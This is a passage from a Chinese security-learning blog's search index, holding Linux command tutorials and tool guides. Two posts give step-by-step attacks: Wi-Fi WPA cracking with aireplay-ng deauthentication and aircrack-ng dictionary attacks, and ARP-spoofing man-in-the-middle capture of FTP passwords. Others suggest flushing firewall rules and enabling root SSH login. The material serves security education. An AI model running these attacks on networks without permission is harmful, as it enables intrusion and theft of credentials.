还有就是，能上网之后也许主机可以ping通虚拟机，但是虚拟机ping不通主机，这种情况一般是主机防火墙的问题，你可以把你主机防火墙关了试一试，如果不会关闭windows防火墙，去百度或者Google一下，这里不说了 相反，主机ping不通虚拟机，而虚拟机可以ping通主机，这个同理，可以试试关闭虚拟机的防火墙试试，不同linux防火墙命令有差异，自己可以百度以下，先写到这，有时间我再修改更新有关知识","categories":[{"name":"Linux","slug":"Linux","permalink":"http://zzqsmile.top/categories/Linux/"}],"tags":[{"name":"VMware","slug":"VMware","permalink":"http://zzqsmile.top/tags/VMware/"}]},{"title":"Linux命令之tar","slug":"Linux/2018-01-06-linux-tar","date":"2018-01-06T01:00:00.000Z","updated":"2018-05-17T14:41:40.000Z","comments":true,"path":"2018/01/06/Linux/2018-01-06-linux-tar/","link":"","permalink":"http://zzqsmile.top/2018/01/06/Linux/2018-01-06-linux-tar/","excerpt":"linux下常见的压缩包扩展名有:[*.tar *.tar.gz *.tgz *.gz *.Z *.bz2 ] 压缩方式关系图如下：","text":"linux下常见的压缩包扩展名有:[*.tar *.tar.gz *.tgz *.gz *.Z *.bz2 ] 压缩方式关系图如下： 常见的压缩用的gzip和bzip两种压缩算法(1).使用gzip压缩的扩展名是*.tar (2)使用bzip压缩的扩展名是*.bz和bz2两种 命令格式：1[root@localhost ~]# tar [-j|-z][cv] [-f 创建的档名] filename... #打包压缩 1[root@localhost ~]# tar [-j|-z][tv] [-f 创建的档名] #查看档名 1[root@localhost ~]# tar [-j|-z][xv] [-f 创建的档名] [-C 目录] #解压缩 个人总结如下：压缩(常用)：1234[root@localhost ~]# tar -[z|j]cvf [创建的档名] [将压缩的文件名...]即：[root@localhost ~]# tar -zcvf [创建的档名.tar] [将压缩的文件名...][root@localhost ~]# tar -jcvf [创建的档名.gz(2)] [将压缩的文件名...] 解压缩(常用)：12345[root@localhost ~]# tar -[z|j]xvf [创建的档名] [-C 目录]即：[root@localhost ~]# tar -zxvf [创建的档名.tar] [-C 目录][root@localhost ~]# tar -jxvf [创建的档名.gz(2)] [-C 目录] 参数含义：12345678910111213141516-c #压缩-x #解压缩-t #查看档名-r： #向压缩归档文件末尾追加文件-u： #更新原压缩包中的文件#以上五个独立参数每次使用有且只有一个，不能同时使用-z #透过gzip的支持进行压缩&#x2F;解压缩：此时档名最最好为 *.tar.gz-j #透过bzip2的支持进行压缩&#x2F;解压缩：此时档名最好为 *.tar.bz2-v #在压缩&#x2F;解压缩过程中，将正在处理的档名显示出来-C 目录 # 这个参数用于在指定的目录下 解压缩-p: #保留备份数据的原本属性与权限常用于备份(-c)重要的配置档-P: #保留绝对路径，亦即允许备份数据中含有根目录存在之意","categories":[{"name":"Linux","slug":"Linux","permalink":"http://zzqsmile.top/categories/Linux/"}],"tags":[{"name":"linux之命令学习","slug":"linux之命令学习","permalink":"http://zzqsmile.top/tags/linux%E4%B9%8B%E5%91%BD%E4%BB%A4%E5%AD%A6%E4%B9%A0/"}]},{"title":"Linux之Xshell密钥登录","slug":"Linux/2018-01-05-linux-xshell密钥登录","date":"2018-01-05T01:00:00.000Z","updated":"2018-05-17T13:48:42.000Z","comments":true,"path":"2018/01/05/Linux/2018-01-05-linux-xshell密钥登录/","link":"","permalink":"http://zzqsmile.top/2018/01/05/Linux/2018-01-05-linux-xshell%E5%AF%86%E9%92%A5%E7%99%BB%E5%BD%95/","excerpt":"1.首先使用xshell5生成密钥对","text":"1.首先使用xshell5生成密钥对 最后点击完成 2.然后将生成的公钥放到linux服务器上12[root@SecEvery ~]# vim &#x2F;etc&#x2F;ssh&#x2F;sshd_configAuthorizedKeysFile .ssh&#x2F;authorized_keys 可以看到默认密钥key放置的文件是.ssh/authorized_keys 123[root@SecEvery ~]# pwd&#x2F;root[root@SecEvery ~]# vim .ssh&#x2F;authorized_keys 然后保存退出，重启ssh服务 1[root@SecEvery ~]# service sshd restart 3.使用密钥登录Linux服务器 成功登录","categories":[{"name":"Linux","slug":"Linux","permalink":"http://zzqsmile.top/categories/Linux/"}],"tags":[{"name":"linux之技能学习","slug":"linux之技能学习","permalink":"http://zzqsmile.top/tags/linux%E4%B9%8B%E6%8A%80%E8%83%BD%E5%AD%A6%E4%B9%A0/"}]},{"title":"Linux 命令之grep","slug":"Linux/2018-01-04-linux-grep","date":"2018-01-04T10:00:00.000Z","updated":"2018-05-17T11:47:32.000Z","comments":true,"path":"2018/01/04/Linux/2018-01-04-linux-grep/","link":"","permalink":"http://zzqsmile.top/2018/01/04/Linux/2018-01-04-linux-grep/","excerpt":"案例1：精准匹配(-w)1[root@localhost test]# cat 1.txt | grep root 1.txt --color&#x3D;auto","text":"案例1：精准匹配(-w)1[root@localhost test]# cat 1.txt | grep root 1.txt --color&#x3D;auto 1[root@localhost test]# cat 1.txt | grep -w &quot;root&quot; 1.txt --color&#x3D;auto 注: 可以看出来，加-w参数会精准匹配要匹配的单词，并且是区分呢大小写匹配。其中 参数--color=auto 是加入自动颜色，就是我们匹配的单词高亮显示 案例2：取反参数(-v)1[root@localhost test]# ps -ef | grep ssh 1[root@localhost test]# ps -ef | grep ssh | grep -v grep 案例3：统计出现的行数数量(-c)1[root@localhost test]# grep -c &quot;root&quot; 1.txt 案例4：显示匹配的行数(-n)1[root@localhost test]# grep -n &quot;root&quot; 1.txt --color&#x3D;auto 案例5：显示匹配的文件(-l)1[root@localhost test]# grep &quot;root&quot; 1.txt 2.txt 3.txt 1[root@localhost test]# grep -l &quot;root&quot; 1.txt 2.txt 3.txt 案例6：忽略文件大小写(-i)1[root@localhost test]# cat 1.txt | grep -i &quot;root&quot; --color&#x3D;auto 案例7：控制字符范围1[root@localhost test]# seq 10 | grep &quot;5&quot; -A 3 1[root@localhost test]# seq 10 | grep &quot;5&quot; -B 3 1[root@localhost test]# seq 10 | grep &quot;5&quot; -C 3 通过以上图示实验，可以明白：-A n 向下匹配n行-B n 向上匹配n行-C n 同时向上向下匹配n行","categories":[{"name":"Linux","slug":"Linux","permalink":"http://zzqsmile.top/categories/Linux/"}],"tags":[{"name":"linux之命令学习","slug":"linux之命令学习","permalink":"http://zzqsmile.top/tags/linux%E4%B9%8B%E5%91%BD%E4%BB%A4%E5%AD%A6%E4%B9%A0/"}]},{"title":"Linux 命令之awk","slug":"Linux/2018-01-03-linux-awk","date":"2018-01-03T10:00:00.000Z","updated":"2018-05-17T11:39:58.000Z","comments":true,"path":"2018/01/03/Linux/2018-01-03-linux-awk/","link":"","permalink":"http://zzqsmile.top/2018/01/03/Linux/2018-01-03-linux-awk/","excerpt":"awk使用教程：awk调用方式，常用三种","text":"awk使用教程：awk调用方式，常用三种 1.命令行调用（重点介绍）常用格式框架：######1234awk -F &#39;:&#39; &#39;&#x2F;word&#x2F; &#123; print(f) $1 &#125;&#39;即：awk -F &#39;:&#39; &#39;&#x2F;word&#x2F; &#123; print $1 &#125;&#39;awk -F &#39;:&#39; &#39;&#x2F;word&#x2F; &#123; printf $1 &#125;&#39; 说明：######-F 指定分割符,如果没有指定分割符，默认使用空格作为分割符。首先匹配word这个单词的那一行，然后以:分割符，print $1 输出第1个域。 基于上面的框架可以有其他变形，例如：123awk -F &#39;:&#39; &#39;&#x2F;word&#x2F; &#123; print $1,$2 &#125;&#39;awk -F &#39;:&#39; &#39;&#x2F;word1&#x2F; &#123; print $1,$2 &#125; &#x2F;word2&#x2F; &#123;print $2&#125;&#39;awk -F &#39;:&#39; &#39;&#x2F;word1&#x2F; &#123; printf $1.&quot; &quot; &#125; &#x2F;word2&#x2F; &#123;print $2&#125;&#39; 注：在awk命令使用中，print是输出之后换行，而printf是输出之后不换行。 例子：题目：扫面一个网段中22端口开放的ip地址(使用awk命令) step1:先扫描一个网段看一看我们关注的重点字段。1[root@localhost ~]# nmap -Pn -p22 192.168.3.0&#x2F;24 step2:过滤出IP地址和状态STATE，将其两项显示在一行。1[root@localhost ~]# nmap -Pn -p22 192.168.3.0&#x2F;24 | awk &#39;&#x2F;Nmap&#x2F; &#123;printf $5.&quot; &quot;&#125; &#x2F;ssh&#x2F; &#123;print $2&#125;&#39; step3:只将状态是open的IP地址显示出来1[root@localhost ~]# nmap -Pn -p22 192.168.3.0&#x2F;24 | awk &#39;&#x2F;Nmap&#x2F; &#123;printf $5.&quot; &quot;&#125; &#x2F;ssh&#x2F; &#123;print $2&#125;&#39; | awk &#39;&#x2F;open&#x2F; &#123;print $1&#125;&#39; step4:可以将结果输出到一个txt文件里面。######123456789101112[root@localhost ~]# :&gt; 192.txt #清空文件里面内容，不带任何字符[root@localhost ~]# cat 192.txt[root@localhost ~]# nmap -Pn -p22 192.168.3.0&#x2F;24 | awk &#39;&#x2F;Nmap&#x2F; &#123;printf $5.&quot; &quot;&#125; &#x2F;ssh&#x2F; &#123;print $2&#125;&#39; | awk &#39;&#x2F;open&#x2F; &#123;print $1&#125;&#39; &gt; 192.txt [root@localhost ~]# cat 192.txt 192.168.3.3192.168.3.36192.168.3.104192.168.3.110192.168.3.113192.168.3.119192.168.3.145[root@localhost ~]# 当然平时扫描的时候可以先将扫面的东西输出到一个文件里面，在对其文件匹配显示，这样效率高点。此题解法并不唯一，灵活多变，在此只是想借此题说明以下awk之功效！ 2.shell脚本方式 将所有的awk命令插入到一个文件，并使awk程序可执行，然后awk命令解释器作为脚本的首行，一般通过键入脚本名称来调用。相当于shell脚本首行的：#!/bin/bash可以换成：#!/bin/awk 3.将所有的awk命令插入到一个单独的文件，然后调用：1awk -f awk-script-file input-file(s) 其中，-f选项加载awk-script-file中的awk脚本，input-file(s)是待处理的文件","categories":[{"name":"Linux","slug":"Linux","permalink":"http://zzqsmile.top/categories/Linux/"}],"tags":[{"name":"linux之命令学习","slug":"linux之命令学习","permalink":"http://zzqsmile.top/tags/linux%E4%B9%8B%E5%91%BD%E4%BB%A4%E5%AD%A6%E4%B9%A0/"}]},{"title":"Linux命令之Vim","slug":"Linux/2018-01-02-linux-vim","date":"2018-01-02T01:00:00.000Z","updated":"2018-05-17T14:39:06.000Z","comments":true,"path":"2018/01/02/Linux/2018-01-02-linux-vim/","link":"","permalink":"http://zzqsmile.top/2018/01/02/Linux/2018-01-02-linux-vim/","excerpt":"vim三种模式：命令行模式、插入模式、末行模式","text":"vim三种模式：命令行模式、插入模式、末行模式 三种模式关系如下图所示： 基本使用方法1.打开文件######vim 文件名 #默认进入命令行模式 2.编辑文件按键盘上的i、a或者o键进入编辑模式也叫插入(insert)模式。然后就可以对文件进行编写修改。 3.（保存)退出文件。（1）进入末行模式 12345678910退出:q 强制退出:q!保存:w强制保存:w!保存并退出:wq 高级使用方法1.保存退出(命令行模式)1234保存并退出 (Shift+z或者CapsLock打开然后按z键)ZZ不保存退出 (这个建议先打开大写键盘，然后依次按下z、q键)ZQ 2.移动光标(命令行模式)逐字符移动 12345h:左l:右j:下k:上#h:移动#个字符 以单词为单位移动 1234w:移至下个单词词首e:跳至当前或者下个单词词首b:跳至当前或者前一个单词的词首#w:移动#个单词 行间跳转 123#G:跳转至第#行gg:跳转到第一行G:跳转到最后一行 行内跳转 1230:(零)绝对行首^:(数字键6上面的那个字符)行首的第一个非空白字符$:(数字键4上面的那个字符)绝对行尾 末行模式 1234.:当前行$:跳至最后一行n:跳至第n行+n:向下的第n行 3.命令行操作(1).删除操作 12x:删除光标所在的单个字符nx:删除光标所在及向后的共n个字符 (2).删除命令：d 1234d命令和跳转命令组合使用#dw,#de,#dbdd:删除当前光标所在行#dd:向下删除当前光标所在内的#行 (3).粘贴命令p 123456如果复制的内容是整行：p:粘贴到当前光标所在行的下方P:粘贴到当前光标所在行的上方如果复制的内容为非整行：p:粘贴到当前光标所在字符后面P:粘贴到当前光标所在字符前面 (4).复制命令y,用法同d命令 12yy:复制当前光标所在的一行#yy:向下复制包含当前光标所在行在内的#行 (5)撤销操作u 1234u:撤销前一次的编辑操作#u:直接撤销最近#次的编辑操作连续u可以撤销最近n次编辑操作ctrl+r:反撤销，撤销最近一次的撤销操作 (6)查找 1234&#x2F;word:从第一行开始查找文件中word这个字符串出现的地方?word:从最后一行开始查找文件中word这个字符串出现的地方n 向下查找 N 向上查找 (7)替换 11,$s&#x2F;old&#x2F;new&#x2F;g 从第一行到最后一行寻找 old字符串，并将该字符串取代为 new！ 4.末行模式(1).显示或者取消行号 12:set nu 显示行号:set nonu 取消行号 (2).显示忽略或区分大小写 123:set ic 忽略大小写:set noic 不忽略大小写ic&#x3D;ignorecase 忽略大小写 更多详情http://www.runoob.com/linux/linux-vim.html","categories":[{"name":"Linux","slug":"Linux","permalink":"http://zzqsmile.top/categories/Linux/"}],"tags":[{"name":"linux之命令学习","slug":"linux之命令学习","permalink":"http://zzqsmile.top/tags/linux%E4%B9%8B%E5%91%BD%E4%BB%A4%E5%AD%A6%E4%B9%A0/"}]},{"title":"Linux_kali操作系统SSH问题解决方案","slug":"Linux/2018-01-01-kali_ssh登录问题","date":"2018-01-01T10:00:00.000Z","updated":"2018-05-17T13:46:04.000Z","comments":true,"path":"2018/01/01/Linux/2018-01-01-kali_ssh登录问题/","link":"","permalink":"http://zzqsmile.top/2018/01/01/Linux/2018-01-01-kali_ssh%E7%99%BB%E5%BD%95%E9%97%AE%E9%A2%98/","excerpt":"刚安装的kali linux系统，为了方便Windows和Linux之间复制粘贴，文件传输，我们一般都会用xshell远程连接，但是，不仅仅是kali，一般情况linux系统都是不允许以root用户身份远程连接的。 下面就ssh远程连接问题谈谈我解决的办法","text":"刚安装的kali linux系统，为了方便Windows和Linux之间复制粘贴，文件传输，我们一般都会用xshell远程连接，但是，不仅仅是kali，一般情况linux系统都是不允许以root用户身份远程连接的。 下面就ssh远程连接问题谈谈我解决的办法 step1.防火墙首先查看下防火墙规则 1root@kali:~# iptables -L 一般情况下都是ACCEPT,如果有禁止的就会是DROP,如果不清楚是什么就可以把设置的iptables规则清除掉，命令如下： 1root@kali:~# iptables -F step2 服务的问题首先查看ssh服务 1root@kali:~# ps -ef | grep ssh 注意看下图，ssh服务启动状态和关闭状态的区别 1root@kali:~# service ssh restart step3 禁止root登录问题修改配置文件 1root@kali:~# vim &#x2F;etc&#x2F;ssh&#x2F;sshd_config 寻找关键字PermitRootLogin，前面如果有#注释符，将注释符去掉然后将后面改为yes如下图所示： 然后保存并退出 然后切记重启ssh服务1root@kali:~# service ssh restart 通过以上三步排查ssh登录连接问题，基本都可以解决问题！","categories":[{"name":"Linux","slug":"Linux","permalink":"http://zzqsmile.top/categories/Linux/"}],"tags":[{"name":"linux之技能学习","slug":"linux之技能学习","permalink":"http://zzqsmile.top/tags/linux%E4%B9%8B%E6%8A%80%E8%83%BD%E5%AD%A6%E4%B9%A0/"}]},{"title":"Sublime安装汉化教程","slug":"工具使用/2017-12-05-sublime安装教程","date":"2017-12-05T01:00:00.000Z","updated":"2019-03-18T02:20:22.000Z","comments":true,"path":"2017/12/05/工具使用/2017-12-05-sublime安装教程/","link":"","permalink":"http://zzqsmile.top/2017/12/05/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/2017-12-05-sublime%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B/","excerpt":"1.官网下载Sublime Text3 https://www.sublimetext.com/","text":"1.官网下载Sublime Text3 https://www.sublimetext.com/ 2.正常安装，安装后打开会是英文版。 3.安装“Package Control”，快捷键 ctrl + ~打开如下图样子。 4.然后我们到Package Control官方网站。 https://packagecontrol.io/installation 复制下图所示内容 5.回到sublime ctrl + ~打开的地方粘贴复制的代码，并 按下回车，稍等一会，若没有反应关掉sublime重启即可。 6.点击 菜单上的“Preferences” -&gt; “Package Control”。 7.选择 Package Control：Install Package 8.输入Chinese，选择ChineseLocalizations(回车或者鼠标单击击) 9.稍等片刻，软件的界面就是中文界面了 大功告成！！！","categories":[{"name":"tools","slug":"tools","permalink":"http://zzqsmile.top/categories/tools/"}],"tags":[{"name":"sublime","slug":"sublime","permalink":"http://zzqsmile.top/tags/sublime/"}]},{"title":"nessus安装教程","slug":"工具使用/2017-12-04-nessus安装教程","date":"2017-12-04T01:00:00.000Z","updated":"2019-03-18T02:21:12.000Z","comments":true,"path":"2017/12/04/工具使用/2017-12-04-nessus安装教程/","link":"","permalink":"http://zzqsmile.top/2017/12/04/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/2017-12-04-nessus%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B/","excerpt":"(Windows安装教程)step1.官网下载对应操作系统安装包","text":"(Windows安装教程)step1.官网下载对应操作系统安装包 https://www.tenable.com/downloads/nessus step2.正常双击程序安装 等到最后一步finish 完成后等会自动跳转出一个注册页面，或者打开浏览器输入https://localhost:8834填写用户名密码，然后到下图所示需要激活码： step3.访问下面网址获取激活码 https://www.tenable.com/products/nessus-home step4.激活码输入后点击Continuing ,此时如果跳转不到step5页面，可以多次尝试即可 step5.此时我安装时出现如下情况，那么就按照找它提示的，在命令提示符（最好以管理员身份运行）Nessus安装目录下执行：nessuscli update手动更新 step6.可能 nessuscli update 命令执行不到100%，但是重新进入浏览器，输入https://localhost:8834 应该就成功了 step7.看到如下界面就说明成功安装了 ((Linux安装教程)1.首先下载rpm包到windows. https://www.tenable.com/downloads/nessus 2.将rpm包上传到Linux，rpm安装 rpm -ivh xxxx.rpm 3.启动nessus服务 1&#x2F;etc&#x2F;init.d&#x2F;nessusd start #启动nessus服务 4.web访问，填写激活码 https://IP:8834 点击此链接获取激活码 5.手动更新下载。在Linux下手动安装的软件一般在/opt文件下。 [root@localhost ~]# cd /opt/nessus/sbin/ [root@localhost sbin]# ls nessus-check-signature nessuscli nessusd nessus-service [root@localhost sbin]# ./nessuscli update #更新插件 [root@localhost sbin]# ./nessuscli --help #查看命令帮助","categories":[{"name":"tools","slug":"tools","permalink":"http://zzqsmile.top/categories/tools/"}],"tags":[{"name":"扫描","slug":"扫描","permalink":"http://zzqsmile.top/tags/%E6%89%AB%E6%8F%8F/"}]},{"title":"wireshark抓包过滤规则","slug":"工具使用/2017-12-03-wireshark","date":"2017-12-03T01:00:00.000Z","updated":"2019-03-18T02:20:38.000Z","comments":true,"path":"2017/12/03/工具使用/2017-12-03-wireshark/","link":"","permalink":"http://zzqsmile.top/2017/12/03/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/2017-12-03-wireshark/","excerpt":"1、过滤协议，直接写协议名称","text":"1、过滤协议，直接写协议名称 例子: tcp #TCP(Transmission Control Protocol 传输控制协议) udp #UDP(User Datagram Protocol 用户数据报协议) arp #ARP(Address Resolution Protocol 地址解析协议) icmp #ICMP(Internet Control Message Protocol Internet Internet 控制报文协议) http #HTTP(HyperText Transfer Protocol 超文本传输协议) smtp #SMTP(Simple Mail Transfer Protocol 简单邮件传输协议) ftp #FTP(File Transfer Protocol 文件传输协议) dns #DNS(Domain Name System 域名系统) ip #IP(Internet Protocol IP协议) ssl #SSL(Secure Sockets Layer 安全套阶层) oicq #(openingIseekyou QQ协议) bootp #BOOTP(Bootstrap Protocol，引导程序协议）) ...... 排除arp包: !arp 或者 not arp 2、 过滤源和目的IP地址 过滤源地址 ip.src_host eq 192.168.31.106 #相当于 ip.src_host == 192.168.31.106 过滤目的地址 ip.dst_host eq 192.168.31.106 #相当于 ip.dst_host == 192.168.31.106 过滤源地址或者目的地址 ip.addr eq 192.168.31.106 #相当于 ip.addr == 192.168.31.106 提示： 在Filter编辑框中，收入过虑规则时，如果语法有误，框会显红色，如正确，会是绿色。 例如：语法正确如下图： 语法错误如下图： 3、针对端口进行过滤 例子: tcp.port eq 80 #不管端口是来源的还是目标的都显示，相当于 tcp.port == 80 tcp.port eq 80 or udp.port eq 80 tcp.srcport == 80 #只显tcp协议的源端口80 tcp.dstport == 80 #只显tcp协议的目标端口80 udp.port eq 15000 tcp.port &gt;= 1 and tcp.port &lt;= 80 #过滤端口范围 4、过滤MAC地址 eth.addr eq B4-6D-83-2B-27-D5 eth.src eq B4-6D-83-2B-27-D5 // 过滤来源mac eth.dst == B4-6D-83-2B-27-D5 // 过滤目标mac 5、针对http的请求类型进行过滤 http.request.method == &quot;GET&quot; http.request.method == &quot;POST&quot; ====================备注： &lt; lt less than 小于 &lt;= le 小于等于 == eq 等于 &gt; gt 大于 &gt;= ge 大于等于 != ne 不等于 以上个人总结常用过滤方法更多详情推荐博客：https://blog.csdn.net/hzhsan/article/details/43453251","categories":[{"name":"tools","slug":"tools","permalink":"http://zzqsmile.top/categories/tools/"}],"tags":[{"name":"wireshark","slug":"wireshark","permalink":"http://zzqsmile.top/tags/wireshark/"}]},{"title":"kali下wifi破解密码教程","slug":"工具使用/2017-12-02-kali-wifi密码破解教程","date":"2017-12-02T01:00:00.000Z","updated":"2019-03-18T02:21:10.000Z","comments":true,"path":"2017/12/02/工具使用/2017-12-02-kali-wifi密码破解教程/","link":"","permalink":"http://zzqsmile.top/2017/12/02/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/2017-12-02-kali-wifi%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E6%95%99%E7%A8%8B/","excerpt":"首先电脑插入USB无线网卡","text":"首先电脑插入USB无线网卡 然后通过VMware里面 虚拟机 &gt; 可移动设备 选择我们的无线网卡连接，如下图： step1: 查看网卡有没有加载进来1root@kali:~# iwconfig 注：iwconfig是查看无线网卡，ifconfig 是查看有线网卡 step2： 开启无线网卡的侦听功能1root@kali:~# airmon-ng start wlan0 此时需要再次查看下网卡： step3：侦听附近的wifi信号1root@kali:~# airodump-ng wlan0mon 如果出现无法侦听数据，重启一下服务,命令如下：1root@kali:~# airmon-ng check kill step4: 选择你要破解的无线网络（ssid）,抓取握手包1root@kali:~# airodump -c 1 --bssid B0:E1:7E:7D:EA:CC -w secevery wlan0mon 此时如果有人连接这个wifi,就会产生握手包，我们就会抓到这个握手包，但是运气并不是那么好，如上图所示一直没有抓到握手包，因此我们就要手动的踢掉一个人的wifi，这样它就会再次自动连接wifi，产生一个握手吧，这样我们就抓到了握手包。具体来看下一步: step5：抓不到握手报文，需要模拟station，进行攻击# aireplay-ng -0 10 -a bssid -c station mac wlan0mon# aireplay-ng -0 10 -a AP的mac地址 -c 你要踢掉的主机的mac地址 wlan0mon 1root@kali:~# aireplay-ng -0 10 -a B0:E1:7E:7D:EA:CC -c B0:E1:7E:7D:EA:CC wlan0mon 此时我们再去看刚才侦听握手包的窗口，发现已经抓到了握手包，如下图所示 然后查看一下当前目录下抓到的握手包secevery-01.cap step6:破解报文，获得密码。 使用字典passwd.txt1root@kali:~# aircrack-ng -a2 -b B0:E1:7E:7D:EA:CC -w passwd.txt secevery-01.cap","categories":[{"name":"tools","slug":"tools","permalink":"http://zzqsmile.top/categories/tools/"}],"tags":[{"name":"kali","slug":"kali","permalink":"http://zzqsmile.top/tags/kali/"}]},{"title":"使用kali-arpspoof工具进行中间人arp投毒","slug":"工具使用/2017-12-01-kali-arpspoof","date":"2017-12-01T01:00:00.000Z","updated":"2019-03-18T02:21:08.000Z","comments":true,"path":"2017/12/01/工具使用/2017-12-01-kali-arpspoof/","link":"","permalink":"http://zzqsmile.top/2017/12/01/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/2017-12-01-kali-arpspoof/","excerpt":"一、环境部署 准备工作，打开环境","text":"一、环境部署 准备工作，打开环境 12345win10 172.20.10.9 B4-6D-83-2B-27-D5 kali 172.20.10.12 00:50:56:2e:fc:32win7~server~ftp 172.20.10.11 00-0C-29-39-45-E7 欺骗之前，查看win10里面arp表，并记录 查看win7-server-ftp里面arp表并记录 二、开始实验step1:首先打开kali的流量转发1root@kali:~# echo 1 &gt; &#x2F;proc&#x2F;sys&#x2F;net&#x2F;ipv4&#x2F;ip_forward step2:然后开始欺骗 首先欺骗ftp(172.20.10.11)说我kali(172.20.10.12)是win10(172.20.10.9) 1root@kali:~# arpspoof -i eth0 -t 172.20.10.11 172.20.10.9 然后欺骗win10(172.20.10.9)说我kali(172.20.10.12)是ftp(172.20.10.11) 1root@kali:&#x2F;# arpspoof -i eth0 -t 172.20.10.9 172.20.10.11 两边欺骗完之后我们此时可以再次看下arp表。 首先看下win10里面的arp表，可以看到在win10里面将要访问的ftp()的mac地址已经变成了kali的mac地址 然后再去ftp的主机上面查看arp表，可以看到在ftp服务的主机上面，win10的mac地址也变成了中间人kali的mac地址 经上面双方欺骗，我们欺骗已经完成，kali的路由转发也开启了，这样我们接下来抓取数据包，就可以看到他们之间传输的数据 step3:开启抓包，然后只要它们之间有数据传输，就会抓到包，打开之后等待即可：1root@kali:~# tcpdump -i eth0 -nn -X tcp port 21 step4:然后我们登录访问ftp服务 成功登录了ftp服务器，然后我们去看抓到的包： 显然抓到了登录用户名和密码。注：ftp服务是20/21端口，并且传输过程用的是明文传输","categories":[{"name":"tools","slug":"tools","permalink":"http://zzqsmile.top/categories/tools/"}],"tags":[{"name":"kali","slug":"kali","permalink":"http://zzqsmile.top/tags/kali/"}]}],"categories":[{"name":"python3","slug":"python3","permalink":"http://zzqsmile.top/categories/python3/"},{"name":"工具","slug":"工具","permalink":"http://zzqsmile.top/categories/%E5%B7%A5%E5%85%B7/"},{"name":"渗透测试","slug":"渗透测试","permalink":"http://zzqsmile.top/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"name":"tools","slug":"tools","permalink":"http://zzqsmile.top/categories/tools/"},{"name":"web安全","slug":"web安全","permalink":"http://zzqsmile.top/categories/web%E5%AE%89%E5%85%A8/"},{"name":"收藏文章","slug":"收藏文章","permalink":"http://zzqsmile.top/categories/%E6%94%B6%E8%97%8F%E6%96%87%E7%AB%A0/"},{"name":"CTF","slug":"CTF","permalink":"http://zzqsmile.top/categories/CTF/"},{"name":"编码","slug":"编码","permalink":"http://zzqsmile.top/categories/%E7%BC%96%E7%A0%81/"},{"name":"Database","slug":"Database","permalink":"http://zzqsmile.top/categories/Database/"},{"name":"权限提升","slug":"权限提升","permalink":"http://zzqsmile.top/categories/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/"},{"name":"其他","slug":"其他","permalink":"http://zzqsmile.top/categories/%E5%85%B6%E4%BB%96/"},{"name":"运维安全","slug":"运维安全","permalink":"http://zzqsmile.top/categories/%E8%BF%90%E7%BB%B4%E5%AE%89%E5%85%A8/"},{"name":"Linux","slug":"Linux","permalink":"http://zzqsmile.top/categories/Linux/"},{"name":"Server","slug":"Server","permalink":"http://zzqsmile.top/categories/Server/"}],"tags":[{"name":"小工具","slug":"小工具","permalink":"http://zzqsmile.top/tags/%E5%B0%8F%E5%B7%A5%E5%85%B7/"},{"name":"传送门","slug":"传送门","permalink":"http://zzqsmile.top/tags/%E4%BC%A0%E9%80%81%E9%97%A8/"},{"name":"Koadic","slug":"Koadic","permalink":"http://zzqsmile.top/tags/Koadic/"},{"name":"msf","slug":"msf","permalink":"http://zzqsmile.top/tags/msf/"},{"name":"XXE","slug":"XXE","permalink":"http://zzqsmile.top/tags/XXE/"},{"name":"CTF","slug":"CTF","permalink":"http://zzqsmile.top/tags/CTF/"},{"name":"sqlmap","slug":"sqlmap","permalink":"http://zzqsmile.top/tags/sqlmap/"},{"name":"mysql","slug":"mysql","permalink":"http://zzqsmile.top/tags/mysql/"},{"name":"提权","slug":"提权","permalink":"http://zzqsmile.top/tags/%E6%8F%90%E6%9D%83/"},{"name":"sql注入","slug":"sql注入","permalink":"http://zzqsmile.top/tags/sql%E6%B3%A8%E5%85%A5/"},{"name":"其他","slug":"其他","permalink":"http://zzqsmile.top/tags/%E5%85%B6%E4%BB%96/"},{"name":"运维安全","slug":"运维安全","permalink":"http://zzqsmile.top/tags/%E8%BF%90%E7%BB%B4%E5%AE%89%E5%85%A8/"},{"name":"反弹shell","slug":"反弹shell","permalink":"http://zzqsmile.top/tags/%E5%8F%8D%E5%BC%B9shell/"},{"name":"文件上传解析漏洞","slug":"文件上传解析漏洞","permalink":"http://zzqsmile.top/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/"},{"name":"burpsuite","slug":"burpsuite","permalink":"http://zzqsmile.top/tags/burpsuite/"},{"name":"python3","slug":"python3","permalink":"http://zzqsmile.top/tags/python3/"},{"name":"sqli-labs","slug":"sqli-labs","permalink":"http://zzqsmile.top/tags/sqli-labs/"},{"name":"中间件","slug":"中间件","permalink":"http://zzqsmile.top/tags/%E4%B8%AD%E9%97%B4%E4%BB%B6/"},{"name":"LAMP","slug":"LAMP","permalink":"http://zzqsmile.top/tags/LAMP/"},{"name":"DNS","slug":"DNS","permalink":"http://zzqsmile.top/tags/DNS/"},{"name":"Ubuntu","slug":"Ubuntu","permalink":"http://zzqsmile.top/tags/Ubuntu/"},{"name":"linux之技能学习","slug":"linux之技能学习","permalink":"http://zzqsmile.top/tags/linux%E4%B9%8B%E6%8A%80%E8%83%BD%E5%AD%A6%E4%B9%A0/"},{"name":"VMware","slug":"VMware","permalink":"http://zzqsmile.top/tags/VMware/"},{"name":"linux之命令学习","slug":"linux之命令学习","permalink":"http://zzqsmile.top/tags/linux%E4%B9%8B%E5%91%BD%E4%BB%A4%E5%AD%A6%E4%B9%A0/"},{"name":"sublime","slug":"sublime","permalink":"http://zzqsmile.top/tags/sublime/"},{"name":"扫描","slug":"扫描","permalink":"http://zzqsmile.top/tags/%E6%89%AB%E6%8F%8F/"},{"name":"wireshark","slug":"wireshark","permalink":"http://zzqsmile.top/tags/wireshark/"},{"name":"kali","slug":"kali","permalink":"http://zzqsmile.top/tags/kali/"}]}